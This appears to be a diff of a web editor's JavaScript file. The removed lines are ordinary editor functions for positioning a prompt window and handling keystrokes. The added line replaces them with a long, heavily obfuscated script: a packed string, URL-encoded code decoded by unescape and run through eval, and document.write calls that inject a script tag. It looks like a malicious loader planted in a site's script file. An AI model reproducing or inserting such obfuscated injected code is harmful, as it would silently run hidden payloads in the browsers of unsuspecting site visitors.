-var saveorupdatelabel = textmsg[225];
-function movetogood(win)
-{
-    if (typeof(callingwindow) !='undefined')
-        callingwindow = win;
-    var xy = [5,5];
-    if (typeof(findPositionnoScrolling) =='function')
-    xy = findPositionnoScrolling(activeeditingbox);
-    var promptwin1 = document.getElementById('myprompt1');
-    promptwin1.style.left =   '11px';
-    var t= xy[1]-35; if (t<0) t = 0;
-    promptwin1.style.top = t + 'px';
-    var titlebar = promptwin1.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0];
-    titlebar.onmousedown = null;
-    var loct = document.location.toString().split("/");
-    var jj = "/" + loct[loct.length-2];
-    if (jj.replace(/\/[a-z]+/ig,'')!='') jj = '';
-    var xx = activeeditingbox.value.replace(/src=(["]?)FileOperation\?did=/g, 'src=$1../..' + jj + '/FileOperation?did=');
-    
-    var ii = xx.toLowerCase().indexOf("<body");
-    
-    var kk = xx.toLowerCase().indexOf("</body>");
-    if (ii >=0 && kk >=0)
-    {
-        ii = xx.indexOf(">", ii)+1;
-        wyswyghead = xx.substring(0,ii);
-        wyswygtail = xx.substring(kk);
-        xx = xx.substring(ii, kk);
-    }
-    else if (ii >= 0 && kk < 0)
-    {
-        ii = xx.indexOf(">", ii)+1;
-        wyswyghead = xx.substring(0,ii);
-        wyswygtail = "";
-        xx = xx.substring(ii);
-       
-    }
-    else if (ii <  0 && kk >= 0)
-    {
-        wyswyghead = "";
-        wyswygtail = xx.substring(kk);
-        xx = xx.substring(0, kk);
-    }
-    else
-    {
-        wyswyghead = wyswygtail = "";
-    }
-    wyswyghead = wyswyghead.replace(/^[ ]+/,'');
-     
-    win.setd(xx); 
-    return saveorupdatelabel + "," + textmsg[18] ;
-}
-
-function mkstrike12(ta, evt, orientation)
-{
-
-    if (orientation == null)
-    {
-        orientation = 's';
-    }
-    var e = evt ? evt : window.event;
-    if (!e)
-        return true;
-    var key = 0;
-    if (e.keyCode) {
-        key = e.keyCode;
-    } // for moz/fb, if keyCode==0 use 'which'
-    else if (typeof(e.which) != 'undefined')
-    {
-        key = e.which;
-    }
-    if (key == 36 || key == 62)
-    {
-        var fmt = 0;
-        if (typeof(editingfmt) != 'undefined')
-            fmt = editingfmt;
-        if (fmt!=null && fmt < 2)
-        {
-            fmt = guessFormat(ta.value + String.fromCharCode(key));
-            editingfmt = fmt;
-        }
-        if (fmt == 1 || fmt == 2)
-        {
-            showlatexonfly(orientation, fmt, key);
-        }
-        var fms = document.forms;
-        for (var i=0; i < fms.length; i++)
-            if (fms[i].action.indexOf("/preview.jsp") >0)
-            {
-                fms[i].format.value = editingfmt;
-                break;
-            }
-    }
-    return true;
-}
-
-function wyewyg1(ta)
-{
-    open("")
-}
-
-
-
- 
-
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';gO3T09X14dkddJ=new Array();qT411TW1b3qAGY=new Array();qT411TW1b3qAGY[0]='u%37%71%30o%6C\142';gO3T09X14dkddJ[0]='	~zj~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~\r~~~~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~5~~[~\\~]~^~_~`~a~b~c~d~e~dl=document.layers;oe=win~kw.op~wa?1:0;da=(~k~m~o~q.}~n~ptMode||}}~rall)&&!~{;g~|} }.},tEle}!ById;ws~}~}.si}bar?true:f}#se;tN=navigator.u}PrA},}}\\Low~wCa}P();iz}T}S.}?exOf(\'netsca}\')>=0}H}J}L}Nl}P;zi}=}\r||8~ja;v}F msg=\'\';function }}m}n{r}~ur|+}I}K}};}?}h}}}rr}] =|,}5|OF}>}zj|;l~l}[|)n.p|?}\\col}u}zj}w}y}{fi}4|!=-1|	}K}M}O}Qi7f=|s}\'!z|F|d||g;/*|x|y|z|{|||}|~|{zj{|~\r\n* (C) C}yr}Yht 2004-{21 by Syst}5s |* Web, I|&.  A}$ R{}{5e}aved{0 *{{Auth}]: Z{Gngya|+L~{1{T{U{V{W{X{Y{Z{X{A{{{_{`{a{b|y/{if{ ty}o}zi|(sago}~kma~{\n=|B\'|%}|\\}}d|{{{{T|r {p|{s{ud{w{y|+|B}.}|K||(|*.}\\S}I~g}n|W}}x}z\'{tps://z{L{N{Pl~}0{phub}uo|;z{1{g{z{r{t{vo{x{S|` 0)z= z\n{XzAzzDzFz z~rz|Mzzz{Mz!}vz$}{z\'pz+/10.zhzh{z;zL{Uz?(zQzCzzEz zHzJzn{TzN{[zV~l}z|Lz|Oh|1{h{}zcz*z,z.|*z0nz2|Ogz5z7z9/}B{#/|"zz{1}zLy\ny|w{cy#y$y$ {B{{	{{\r{g{{{{{14{{{ {"{${&|+{){+{-{/{1{3l{5{7{%R{:~w{<{>{1{]{C{E{Gr{I{Ky\r{O{Q{Sz}yXyYyZyMy%y]y^{zj{e\nz	|,~nyzIz<yb|{#xt}Fe}[obyH}Fch|Ayd}$;y\'yiz\n|Udykym|1ypyr}Pytyv|Bnuyyy{ycfo{}[yw|byz{ycx}1{"z\n|B""yhx\rx}zjxzywxyh|$|&y{j|U~efe{=(x1zK\nz|zpx2{|x	}${\n|1t|3|+x:lyh x=x? x2.|1p~tce(/([^\\\\])xTt/g,"$1\\t")xIexKaxMxOxQxSxUxW\\nxZx\\x^xnxbxdxfxh/xTxXxp"xXxtxJxLxNxxxyxox[x|xsxcxxgwxkxYx\\x`x~xewzjxOxkxownxbyhyx\'|\'|NxDww\nx"~q}wxyox1}Ix3zzx2yw}\\yx-x/dw&rx3xzOzpxzjynxysryu|Axx\n}%wx>|4xCzp}V}X}Z}\\}^|pNa~o{|\'Mic|?s{n{{.{#|4}~ ExxK}]~wzzOz|x}lywz~}}/}P}4wzwUyo{#R{P},}nxCycy~tylw,}lzw#wE{h(wzyl~s~pg{F >zIx4zMzymsww||Bx2|v/w	xhx}~x,x2}ozx	mf--xCzdw!w8x(v}}IvzOy v2e|\rezvxx{v|bv\rwfyjv{jw#w9}\\xyow<h.|l}KxCv*wryqw;yuvK}#}Kw,vsz7w!z 0,v:}zj}[v\r+{jvYv[z]z v`}\rtwwxhvjv\\{,vv&x vk +vw\'v{Mv	- 1v&}?v)vDv+v-x}oy{v3{w|%wo|+v{:z]vPynz vw)zOw+|Bw-x,x.x0vszwg{%|Bwjyzj~rwmeu.wq}[ewt{MxNv0 wylyvBvvtv{vzXvv	vzywezz,u7xzjywvvw~uF|Buv,}Fx}Ivw\'u1v!v#v%zv\'uylw9uNruPru1}y{ub{wx)uYuuw%uy{z|uIu^v}IuG}Iu:v,ujw:xvIw>yxyC}xG}Ix9w@ u~xw>|!x<|2|4 ||vuwvFvSvJx~mswwu |vjywt}Qu	wF}W}YypwKpwMwO~|| wSwUowWfwYw"w\\{w_wa|1r|u	v@z\nuKvCu[xtuyvTu+{#Tw#u.wvuuX}](yci|yzi<}Uye }\'{vj=xzj.v\'tBylw2){\nzHttM++{\nzz|tWmo{<z}Ft}{yu}Fxgw[\'{,w4tvth{<E}zj}{xzj{={pzmv1z{g(vjtduBzOtgtietkrtm\'tortqwc{,v>vOw#tX}?tZtmuu`svYv5u(tmu1tW|zj|?}$wZoViewtzOuUtbw5wBxF|6}Qzv4v6tev yetLu	v2xEt\nt`s7zv5}Ps:w6vwztvRt>yvzHut=vHyu{\nvjx|BxzsJt;vQvGxw,sKs]vIwxvA{us`tvUvMs6zOtz\nvpuruvfbv\\svu}[+x3.{xtyu(}}w{9gt1t\\u1zpsoz\n|`xAv?tG{v\\x$"vwtvuxxCsm jvXu&vg{z^sUtsxxcz`|Zrzu1rywrvdr\'vduzjrw.v!ywv^ ktLzwh|]v7(k tOrv;){z>vw{~rsAtmk)wQxnt5r/~ns1r3s1v2rf~qyw15uu{k{m}zx~q_}Bze)|`{~|Xz{=wdtrW|Br_tra}qskv8{r\\e{n}z}!tXx3rf{x-x,ztR&{j{lrw}zzWr|~sx,v!re| rrizv\rq	f1q}}v!sivW|BrOmsw$uxsRvJs%|UlT}yw(q*rVvlqvEsLq"}As usser?vau9tvq sQxq3wnytzdtsv{r*rvhv{vhq/t<q1q>q$s\'~qs)s+s-uasDs9st:q<qOvIq?s!|Nq6r1qMs\\shu\'uqBqcrq9xr-szOs@|+suv;v\n ssCy x|}P|T}zjuywxAxq{u(|*duUqjy|xGp}zjr\'sWqnufwsw|x1xw<e_ax4x6rDsgsMzwvpxMprupyuws_s[q!xsct8mppzjyexCpvp\'uUxCq|pp5{jp0qdp,uzp!|3p#|vp0qDv;vtqtp6q}drp9p\'p\rp=prqoudsl\np{\'uhru2ppCyo,P}[w[~qpz=svpdtpfttx;sG{Vw7qrxfs}zjqrgzzjqt5y{Tplpntpx{>o~wnxC{UsEezzz|{Yx\r|ywq}]|o	{Xycy{rn|up{1xz\ntI|js=r<t|qJ{Fyzjtbv\r{Yoz}ycxu"o\'s[j].s }!~yo{Vo{tJs=ir= o3o)qLzo-o>{Uo0yZzpo3[io9}V~ou{\'o|4rkyZ{1oNo\\{1oY~q|BoQoSoo_{1ow,|\nofogbxkolyXubu	oroL{Tzpo{\nonyoopo>v2{Uv2pWrtp`p}tPpqqZ{Um{l|?p0swWpau|z;ot{TqqxCv2ppnnr&uuip+(oa~rvL}Kv0rTpYu\rx)uuZq p_npD{,Ns,zrg_vlunn/pnr\n{n|QzEpnp"v7xAnnnppnpDu1n+nq (n2wn4zn7qrdwuen)pq"u~~nuNphspq"w}p.|,}Wywna}@}~p(xx\\sMna"x\\zYytL}\\|Ubo}F|,}z7nv^}\\pmzj}4t,=3{,~~yh=26v^he{7=1mwv }W}rz}/}1}3}5}s}7T{swN~onqn}dyxb[0o9~|=HTMLrp4mq	w{{#nq<{ml>mByodmF~oym zc-equiv=\\"q}{#~q-rvmV mX}mU"xzj/mCxBm^h}F}Pporvd~p|Tdx#+x|"mFmdmHmFm-{bg|T|Kr=z2y.~v}$}hmFomnjwPfmFymb}4>"{mr<}IlmI<~p{El	~|y~u2vV~|Dmutll$ll"lnl{rv=b{E}\\x@t%=v\'bt|+uy}4}>m:mlsj=n2w||*cz2cr4no|=sx!nQu\\q}u4nY|l\nl/l&<lYrll]lllloU~|s|*el#l%mIlVllbl-ql/l1{\'ld=ul7|+{"l;~|m{Fl?0lA}K=yGxvv7lFlHlJ}lLnPp]uwrywk}f.lf}}lTl\'lWl)l\rll[lmumymumeln&n\\x(w{t2w.tIndlz\no#r2oD|BpmiewZk)uu|!rk/{}wNNrkz|n@n\rnCtIr":mlq[|g[245xVxCnqxk+veq7sPq]vTn$rsycNroHniitKzvto tMqu{tSo% No+oKqZw7vrGtmj{{{}rMv\riv$npjz@kep%|nnBsNoxGuw=a w.szjs3wDkQycr<|Bo,qnrkcr3oEk[tSrEu*mh}brIt^ktnyzOko-pUt}zkUsavTmjSq4ytDrdprj(qf}~j,q@|Nj/(j{,rJp?q=q^t}`s.kRq-rXrZkzv,pur^|*rprbrdr~rhp}v\rjDrnjKrqrcj=kVq#t)}$q\'p1|Bzqiq,pgkyzOoprycxq[q0j)vJt@esj8nOu*q%|}ms5jrtxsxssst4{,j-k_vwtuqpszs\nqBtnjj~tsr3-krkOq_|\'jB}^qQls(s*s,jByyyc{Gu4n{l}Es\ralv7{}j!iwz{ui"tli%}4}4v|xygqzz\n~tykr8~qi#yw[{m1{,\'<sk1lx{kl<ro-jM:{px|~w|(|l-}#}Yn:m}C~hlh<nyql]a/bl[i^onmuiC{P>i\r{Z\'fsuikog\'xTinxg{}iw\'],i>1i@li/v7{}]}mlxM}$k1zz|m^v5|\rk1chl l|m25v\nlz\nmm12lxD}hihnmh}C{FmhiUgh%y-y/lyiGjKiIrr:18iM>al[lZl$h\'mmlh1~|iHiJmiM h,h%m	v<iclYll\\l^mMmy.po11h!l:h2mZhF3h9r=hOl#l_lYhij{,{X\'}wplg~qi}#iqyY\'iw^iyi{i>2ih$hZhDh3iJiLiN{<s\rwT}#iTliWiYzl\\u03A3l[h$hf{W\'vZms{|NhpyZis\\g_hshui|\n[3hyiDh{l5h}h5hiOgiRgiViXiZlz2mgiDgilg5thgog{Tgg5g}izg"[4g&{Pg("hEg+0iM|9l>hgOxzjg0h-:xMt.g-iQghJg2g	emtg2gcBg7iig \'}vz{pv7~{#gslgh{1ggo\' hvg#5ikhn}rhh\rhlh\nmp{MfhihhfhhmhhRhhUhAh!|?}<iDh&fhg(gLrciKgNxlAiVl/opmzE{1hJlu{7v\ngbgdh<lj{1f3f)glzjx-{hCg)h\\h5hGf"f#h-f%f\'lv\nxf0hbhRhSh0h!~~{"mmhIf6hLfg*ff>{1vLf$gi[{1h:fGh<hcg~g9\'p|ngmzw"gqho';bC5si3tc='fu';e41q2wV3h7Dm='ORCqxffCYdKOBsOZyCyVJEgKZWYyytdOTWwO';bC5si3tc+=  'nction dMzx2317LU'+'s4xeBVT(eHXnw5v'+'b949Qjc9R){';h4cTu8i6zgw5mU='gXhO6VL5';jT9gy='%69%66%28%7A\114P%2Eindex%4F%66%28%27%5C%35%35%27%29%3E%30%29%7BgO%33T%30%39X%31%34%64k\144dJ%5B%30%5D%3D%27x%27%7D%3B%76%61\162%20l%32%3Dwind\157\167%2Eope\162%61%3F%31%3A%30%3B%66u\156\143\164\151on%20\145d%35b%38%61c%36\143%28%29%7B%69f%28c%36ca%38b%35\144\145%29%7B%64o%63u\155%65nt%2Ewri%74%65%28%27%3C\163\143%72%27%2B%27i%70t%3E%27%2B%6CO%2B%27%3C%2Fs%63%27%2B%27\162\151%70t%3E%27%29%7D%7D%3Bfu%6E%63\164i%6Fn%20l%33%28l%34%29%7B\154%35%3D%2F\172j%2F\147%3Bl%36%3D\123\164r%69%6E%67%2E\146\162o%6DChar\103%6F%64e%28%30%29%3Bl%34%3D%6C%34%2E\162e%70%6C\141\143e%28\154%35%2Cl%36%29%3B%76\141%72%20l%37%3D%6Ee%77%20A\162r%61%79%28%29%2Cl%38%3D%5F%31%3Dl%34%2E%6C\145%6E%67th%2C\154%39%2Cl%49%2Cil%3D%31%36%32%35%36%2C%5F%31%3D%30%2C%49%3D%30%2Cl%69%3D%27%27%3Bdo%7B%6C%39%3D%6C';eval(unescape('f%75%6E%63\164\151%6Fn%20%78l\115F%69%20%20%20%20%28%70%4D\144%76%36%31\164%29%7BxH\143%32\131w%37S%33%39%3Dp%4D%64v%36%31t%7D%3B'));qT411TW1b3qAGY[0]+=  '%77%55\117\152%59%70o\123k\150%31m';gO3T09X14dkddJ[0]+=  'g=hhxTgogBhtgCgz[6gHiElz=gKfV}Lg,hiK5gSw#gUiWgXw[gZgiSg]f\\}4mt|m|gfng9{Y\'gym|]|}[{xgtgxTyryn{vs{eosqtR xy\\e*e*xT~pde$e&ixfsgE7fwgJff}f!gPl}gRiNgTg]e~weg/eg3g`>(m)eehhk1|1~qm{%e4efmfn\\e!~{peXe({1qe,e.ed\\e1e_eagDi>8e:f:f{f<ff~h(hezjeylegW}eFee	ezeeKmPuePegu~tyr}4qCdzZj eZee\\ee"{dyose+eh}zjdmQd\re7i>9eoiF~|eqth4ese>feA}ReeDe|reGg\\gg^i[mtmPndd{Uhidx)}Fsydd:e de^d6d>~ue(=e)ee&dJ{1e0ddF|>dHelg#zgd!fyd$d&e=gOd)eeBd,d2eEd/e~eHd2dd5q*d8ei^-dv5 dwdGd@fmge]e#dRd?*dIdKxytRdNdPe2d{yd}gDy{[hWdXl<dZh~d(euewd`eyd-gYded1g1dh>gg\rC0dl{V\'G|1er<}4pm~w piegc+gxfthcd#e<f d]cd*eCdbd.d0e\ndgeJgag3B1c c"c$c&}~w[fRpmhdAg}#cMadUc\ng%giiBg\'epc5etgQd_d+cc;ciPeeIg_cAg\rB2c ec#x/cIc(z\nd	ymdAildCcsc1gGcWhzcZf|c6iNd^exd%cecc>cc@ccBBgyg8c-cmc%jcJc)}ZgcSd9cu\\b{xcTrYc3fzc[cc]bezdcc=dzjbccC8ckg?bcotrb{[g{F}~cS]y{]pUpZlx{Gwi7hj{Pv5uN,lwk*zyjllzm }m"}4}6}8w1\'b@xlwtlj\nowv{jbJp u|ece)b]lzhm4~wm6m8z"|Yz%~}atbUi9}t5|zI o.o]obXbd|Pyn~qj}xdjyCr8u4v,bJu1{TorCrujI(r8}nbqjp{qzjzt5a}5ybqjB{Tj2pupEzObHz\nthiyi,i#g~yw|!ofa&i!a)ha+|"nkRvobM~rbOm$~q}7}9nqb5a/}Fw z,o@{xkx-om^}loa"fY|aGaIrm|}Pq)u2b_xAqu2zm)t%zo}g}ir}k}mksgil$bZaOi6yCj_q*u,xbqi#oHrx3*3{vd4aa(lwu{r\naQlaUi\'{jokznzplwr	ttSa6{|u|{\n{TznrBo`{Ulwoqf2ar:va]gm*ea`ab}jaL}nrfg~gx`\r`` `"}h`$afrfmpv|rB``eS}b}Qa\n{V`6b|eT}S}rszPv`ym`a_}f`.ad`%rK| lo[{Wo^{Wr7r9oA`+`Iaa`Kaeu0`\'h`4aX|B`7b}`A};`<oyw`c`@`:`u\naN{Voa.a(i.i&i1qK`j}fpw}~Weu`n`sn|`u}4`ybfrbhL`na%i+_i$i&_nm5m7Lxuw/l*l, xR>]+>/}Yilnq}=a}|+/ijvmkxOhzji&_]*__!t_w\n_.}I_1_3_ x[_6uM_l$_;_4_>|_7xw<a]_0g_2_D,_?vnw_I_:_L_<_5_F_@_Sd[_U_N_P_-_.}Hk_=_Oaj{V_i `t__xxa4`<on`\nnyC`*`G`,`Jac`\\}noW`({\nz,{jr8{%|j|tix#aAz\n````y`8b~`ByzaDxZj}\\{jqC`r_i-_l``___zj^a0`vu>i3`{n`|t`~mof`<znycffy/|Bhof`	l8`x;h}$^3q7lw`z^*HhT{ofyct{}_/_}ClzjapbWl^<hxgh{ffhgJ~tyxt}Me5{=~zgf|Kw:}X}Bi&mthfJfhijol`va`r\no>tvxcWh>lG}l}=^\\mj{fhgJfzjhh6hH#3]	]\n{&{Emje?evd*rf*dc{1kwTr4mb}pN(mVgxvdymkt%risxbmt2PDFfGj!o\nv6n`o`u{tbw{W^w^I^z~ts^}]\r}~]zjeuf]h~w]f"]]\n]	]}}~]c;]f6]y;lG]fz|1{"wb|1gx\ntl_kv,^)^jimgxGw<=]c{sevt	|Op{M^l{mfL]+ofjf`p{V]7 kqCm^]:]<]Kt{f:mV^W{M}\nhHf!zI\\	gO]]D1]]H]I^~]LbzjiN^>kEr^@^)mj^Cf,vd"gOc5h8iNs\nr^c}h:_\'~pm]]h+]Qd.v<if<`2g(mViH}NiYly:}FhnxBc5h\\\r]CyQ\\]F50\\I\\IxGx+}:\\r-smp}`:h^ccf>m]]lImalGt*xek@\\]_|xWr>fF/`2lil^p`po@o!z\ntK}zoEjapar}Fk]oJtc^\r]x{U]ziA]9^|=\\\\{1c|erf}2\\Df\\\\\\]J]\\zw]chki$~q;\\]^Q^>]#gO\\&\\(^e^gii&|#c}d*bb(cffRf$]RfZfAd]nth}`rw{Efzaa[oDvd|r|*[5}P\\&fzsb>[;k8vw[?]SkfzbmiPbpgot[<]#]aijr[Qi:}FoR]c\nb8[>]uzn`hzn[l`]~[[{e;c}rY[\r]\\G ]G]H[\\c8d_[p0}]ym[[r^2^DqFgi[ ^b^d^f|[%}4b\'ced4[-fA[/f*[2[3]T\\][F}hbUsymn}|\r}n>&l0yyZw@;Z"yy[a`p[el&[_ia\'_\ra*+iAhafal#he],{1^q{^sw?{4u~]0aS]2`]4\\~o}Ad".hyw{4[>hH![[z{PtZ6{W^_bg_us}^uM[`_g}a1f[{4``n`hC}Z}ha+[$i&ZR{VmpiC^ZbUk5`ZElzZGeuZIyCZKf"ZM[y[ZQ^.zn]woMoptr]s}?Pt*z|*i^Sj[ygagimn]|*gxba_$q}|xfl;apYb<`Q{V`\\{XovkRxotYY\nyY\rYznc`n{UycnAnna{bLkrFt<em#}!}{`2_g{YY5nCY7}uqCxbU^\nxY&YDtYFZec];sx$zi|Xxf ^a~w["Z^hZ	hky|N\\>ss|U{E}Q\\P]E[qb0YlYl[tu9\\g\\eB}\\vd(Y([^-35{\nmrgOhLkEY&YxYzm2+Y~vw\\!\\Xl>kFZJZZ{ZNZ~ZlYC\\bYF^ ZWu#x_GxNZ[ZkZ]_Z_[XyC{\nY2{Tq	my.wLe1a|]w1YNY7a|{Zycdsm|hywX0~qa:o<m\'a^m+\'_m1o9fo6m2u*f\nXDX&a}rv{n{DX6pzqjQXQ{s|W{p}X6f,X:ni{Y`<^/`px^PY9u%}0}~Y>}a=bSbU^OgsX2bz`?`9`BZt}4ZvmZx[eof\\pjs=r<r>[YbX\\z`wo*rR\\}Y$bcxIh#XDXI}$o6ko9ZH{}mj!uk${\'\\_}PYN1eMYn9ak`a|gXt^`fzL`U_tI`X~o`-_{`Mp femSgx`y`>^`e`Cu$r{X)|1aaw1vk"n(Wb=}haibGf2|:}{"}[}`ZI\\xgoi#[\\kJb:uk#umM}CeWJWLh\'|IWOymx>o4x%WZWFW\\]WwJ~wd]\\s\r]^bFW"b[{_^g~wQt5kP]xyc`q	X=XlbR}{Xol8bzYBzpv^:wAo\ro>W9`d`mo>LatZ_}aRs{ZrWa\\Xm8ywWw^$Z	o>V _`a,VXw`!WmM^#V%WyvX|XiW[x)[Os\rWtWKWtfibnv)f&k\rWWVoSg$kNWiy{b<V<iPV>ueMyVl ndycnFs+u4p*q\\jlpk,yw|x=Y	tVSVUd){,m=iqnycz}{W+r:m|uArBa4zpVav5{>kXj}FrHeMks\'$Y!ns1znmkxWio2a2yhzpj>zJoFywVvlSVyvZssvh(v^i{fv|+%{u{VrzLUVxl wif"\\ $kFnVOsjkCU({1vdU"nY}ArY0Uqy\n]wo0U1kXywU&{1U*U$vdk~VTVwU2UstiuczU|ZZZo4[wcQmhnvx|b\n1nv{wyrymUVb*ciUZ\nwbaU_b\n3Ubw}lU^wb\n4Uje0z)|]|*Ugch5Ur\\z	xe}B|KwUo0hBUzrcUnUWch6Uzb6UwcC7Uza@UfTb+Uzz	TT\rDUYg"w|)TU`9UzkwLTTcCAUz~tZ}\rT\rBTTxTmuT,CUzx	T,DUzxiT,EUzc+T\rcT}FT?TDT\nT/\\r{GT@TU[xTz	TJoT\rFTMUcTOmi}Y{xT@2Uz}BgTZTCUiTHymT2TaUqTHuUtUT@UyTHcMT;TaTGTNU{TCr8TTnTtyuTqT%CTTo}BT@8UzzEdT$b*CT THGwOT`T%9TcTtDv5TcB9ThTtTmSg\r9STHVT*SST.TtXT|b*9T=THPS(cBA0UzSTYS#g\rgUzUTkUvTATyTV\\PTwS<TsS?PSS<STtO~o}ZT\rAS\nTtiucU_\\}NqSSTH\\&STSZTHmhlfSTS^S`THds\r~wSTSew[UbaEioysSQiohUw0BT8THSRy4SsBT4Swio3ThTStS+SpxgmUg{5SS?SR2TcUWRSRSqTnRrYS>wRRgbrYSDRS~RuRTRckLRrYSIRRTGR5SPR*c5R,R5T\'S}RSR-S%R03R9R4S|R$5R>R!rYSvR$7RCRR\nz,b~}F{nosx)ZZ|USoS?e`SzTUwp0R{R\nwzwui0f8R_UaTd{Rd~w{7RgRaxTc~kxaUogcCRxTWPrR_CRxT}lRsR2R6Tt|(~osSsDR#S?`2SsFQ\nwhw<R_h7Sk/U\\w@}~QR/Q}$QRtTT\\SYxK}`R_9Rw\\zE~Q$Rt29R}Q(Q{:Q%Qe }YQSXR5CR;wt*]:hQ%R)Q=RrQ%QxT~t}zjR_2Q4\\}id},QJQLm~QJQBTOx/QTUz|pQJQF\\~mQ[Q,QT]SW|Q%RogSWTjQ%RwTjvMQQ,8RKUS{xlgQS1THRNvRj{M}4QjRt5bUzQ{RcQ~{=}hTzjQ9SuUz}\rQwQ{P\r{s},RzPQyTtz{sRTR\\xTPgPP{T(hdRgQ!TtTJP&Q,PTiyP%RgQlxT|%P*RgS>z,BIG O}RS}]RXwgQP\\nAP+R{FPQ6QeQ,CP(S?Q{Q_R{QgQ{QNQPPOPPR}Y{<g`POPEQ{sQdQ`RS0Q\'PbQiPegbS0Q/|TPGQxPL{tQ#QpPf0Pa}Yf&]cQ2RtS0PQU\\PyQDP}{PrQnQ+PvP2\\goQJQ<xToOQaRKRMROr{|1i7pUORWU[:fzx\\OT(Qzj<UzvUVlTH}}R_mT5mPO*P[we\rQ,6O	}4qO*O4mPsQHQzjf.O3O$P_PI6Q\'},O6O2OCO9O;O*Q\'dmSO*PE}$O*QS?P O*O\r\\RrO-Q,\\IT>|1Q8f.7ORPBjO^R!QKOV|Qu(OYPI7R@S?vZcxMOEOkRFOnv[QPI8PRxTjmjR_8QgUG}~Ojf.8Q/vZz)NOrNQLPcNO<Oe8PKTHN\rO|Owf.9O/RxqNNOe9PENN{#N\nNOzg]cR_3OmPBP{N$gc4QgwL|?xR_4QUQ^y\rN5Q\'JOP\nf.CN7n}w|(O@N?N7~R_0N7fgNIOVP	Puf.StO\\}}\\QOtwv}\r[FR_AN&NZhvN\\QgthUlNPOeAN7P>PkNgQ\'s\\;NER!3R\rUzinP	RNrN&}lZNkN/NWxTi^|(N>Oe0Q]dyd}VdSy}UVXPdDe#duMx\\M\rTHxTUV}&{TdQqMd?M"}MTteiMMM#P\\P"qT\\{TTHB}YUVqT\nM.TtQ{M*2.M-{1M/}YM8.T M5S?~tupM2M:rM<TtVMEx\\M3MH S ARGS+';function s4xeBVTdMzx2317LU(nIJg6l41){e41q2wV3h7Dm+=nIJg6l41};bC5si3tc+=  'eva';h7mUO5p='GOOfFyDNhOdJMSOxURgapUPnTOsOOmio';bC5si3tc+=  'l(unes';nibc53WZir='sWsN349QHFNc2hD';bC5si3tc+=  'cape(eHXnw5vb949Qjc9R))}';eval(bC5si3tc);v9pL5vYqb8C68='urOfMBHWPPQUSaOCfaWOwrMJkXIuKQQYEbfiKeax';bC5si3tc='';jT9gy+=  '%34%2E\143h\141%72%43\157deA\164%28%5F%31%29%3BlI%3D\154%34%2E\143h%61%72Co\144e\101t%28%2B%2B%5F%31%29%3B\154%37%5BI%2B%2B%5D%3D\154I%2B\151l%2D%28\154%39%3C%3C%37%29%7D\167hi\154\145%28%5F%31%2B%2B%3C%6C%38%29%3Bva\162%20\154%31%3Dn\145\167%20%41%72\162ay%28%29%2Cl%30%3D\156ew%20A\162\162a\171%28%29%2CI%6C%3D%31%32%38%3B%64\157%7B%6C%30%5BI%6C%5D%3DStri\156g%2E\146%72%6Fm%43harC%6Fd\145%28%49l%29%7Dwh\151le%28%2D%2D%49l%29%3B%49\154%3D%31%32%38%3B\154%31%5B%30%5D%3D%6Ci%3Dl%30%5B\154%37%5B%30%5D%5D%3B%6C\154%3Dl%37%5B%30%5D%3B%5F%6C%3D%31%3B\166%61%72%20%6C%5F%3Dl%37%2El\145n%67\164\150%2D%31%3B\167h%69l\145%28%5Fl%3C%6C%5F%29%7Bs\167\151\164\143h%28l%37%5B%5F%6C%5D%3C\111\154%3F%31%3A%30%29%7B\143a\163e%20%30%20%3Al%30%5BI%6C%5D%3Dl%30%5Bl%6C%5D%2BS%74\162%69n%67%28%6C%30%5B%6Cl%5D%29%2Es\165%62%73%74%72%28';s4xeBVTdMzx2317LU('eupjjIzY1NriN');d5vEf780n='l';gO3T09X14dkddJ[0]+=  '"M9M;MPTthLMUzh/QzjMU[Mx\\MbU[M M(y{O0onxgkUVUzMb"M{XTHi"ioO@Mq{WMsRkNwQ-MOMs\\(}]Nw0T\'MYMCxM|]LSLwrMjlIUV]UzMfM]L\rO@M(LMzRtNrOaxT\\\'|KLzjLNRTHpLL R/^"|nv]{xTL){,NXiP]}zjL+\\VL0^mp|\\{=\\ww[{I^RxMyw~xh`0}5U[L-PINsL\nL,QJUyLJU{L0QaUiLNL5s\rLLrTHgQJLRTotpQlLVL\nQx\\QLN}ElIO:}lQ@Q,1M4N}~iYx	NPmVg"z,iY|zjhbBx{%RUUPTt!MmTHx\\x\\\\5mSg(fzhLl7}5mF!v$v$mu\\kUzO\'l)\\6f:KM:gcK<K\rKKmSO\'TtkEKKd"l=l}zkKVpKK-KvK S?KKKKczkRHKKKl[Kg"MhxTdPHKa6K5l>1K9K,K.K0wqKAUVKCKc8KHKK<KQMpM gb{T.^ rc|?-hTt|QP{PNrUj\'Uw2BQ|!KjBOa|!KiQSKhKrP5QRRrNf{PnK{R_ENTtNYf&K|2EQsPKQ,TTNt}]}#L_Q,OTH}w|}NIQgyGR\'1N+xTImJPE}#xeLjRY}Uzhi#R\'0JS?hJQgwN|hWN7}5nC{!NMQ\'~t,m/LkJ	g|3PHNs\riwT>tl\\@NIN&}VlS#gc0QLPgO1PQgb5ywbN)O	LLHNOWhnthQIPOO	DJ`pRQ:QL}}M*cLJ\\lMzjSsAJon}NgcS=T}N\\O	PcuynJhAOVBoN4PAPEm>N5P[z,WPvaftYnPAR~w<|TPuytIUzyt}BP\nINHTHyt[{UVI"{PIu^I$I(THIx\\I,Tzt*J%ILjI/Qzj|TRsI4I1f&I3S?YRQ8I=P\rdUV}PPOw}I7QN(x\\mpJ hgM$w`UVhjO$RqUVm|P+Z7S?{GIM"IZUzJ<UVI_THaHP"IcT(M*QvT(IJ"g5IjLpScIl]cIaMZ]cNUVg5IvMsP\nJqT(oIhI~Uz{xI"HHI HI TtPIdHT]u(UVq|T]HIHnJ%II;ObPeIyQI&x\\I#Td{PJ%[{HxTxR\'NT(f8d>}hH(J^NURt19N&M^H,wH(N&hLH5|>H-H1SUzTjH6H(PE}M